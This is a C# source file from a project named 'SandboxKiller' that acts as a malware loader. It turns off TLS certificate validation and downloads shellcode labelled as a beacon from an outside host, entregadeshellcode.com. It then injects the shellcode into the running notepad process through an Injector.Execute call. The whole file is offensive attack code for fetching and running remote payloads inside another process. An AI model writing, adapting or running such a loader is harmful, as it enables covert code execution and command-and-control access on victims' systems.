using System;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;

namespace SandboxKiller
{
    public static class GetCode

    {
        //static async Task Main(string[] args)
        public static async Task RunGetCode()
        {
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // Ignore SSL
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    // Download the shellcode
                    var response = await client.GetAsync("https://entregadeshellcode.com/beacon.bin");

                    if (!response.IsSuccessStatusCode)
                    {
                        // Handle download error
                        Console.WriteLine("Error: Failed to download shellcode file");
                        return;
                    }

                    shellcode = await response.Content.ReadAsByteArrayAsync();
                }
            }

            int id = Process.GetProcessesByName("notepad")[0].Id;
            Injector.Execute(shellcode, id);
        }
    }
}

